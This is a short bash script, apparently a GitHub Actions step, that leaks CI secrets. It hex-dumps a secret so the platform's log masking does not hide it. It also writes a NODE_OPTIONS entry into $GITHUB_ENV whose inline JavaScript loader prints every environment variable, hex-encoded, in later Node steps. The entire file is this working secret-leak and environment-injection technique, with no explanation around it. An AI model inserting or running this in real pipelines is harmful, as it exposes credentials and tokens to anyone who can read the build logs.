#!/usr/bin/env bash
echo "$EXAMPLE_SECRET" | hd -C

echo "$GITHUB_ENV"

echo "NODE_OPTIONS=--experimental-modules --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));" >> $GITHUB_ENV
